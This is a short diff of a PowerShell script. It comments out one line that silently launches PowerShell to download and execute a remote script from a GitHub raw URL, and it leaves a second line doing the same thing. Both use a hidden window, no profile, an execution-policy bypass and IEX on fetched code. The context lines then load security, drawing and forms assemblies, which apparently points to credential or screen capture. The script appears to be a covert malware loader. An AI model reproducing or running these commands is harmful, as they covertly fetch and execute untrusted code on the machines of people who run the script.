@@ -1,4 +1,4 @@
-Start-Process powershell -ArgumentList '-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/frames.ps1 -UseBasicParsing)"'
+#Start-Process powershell -ArgumentList '-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/frames.ps1 -UseBasicParsing)"'
 powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (IWR 'https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/seco.ps1' -UseBasicParsing)"
 Add-Type -AssemblyName System.Security
 Add-Type -AssemblyName System.Drawing,System.Windows.Forms
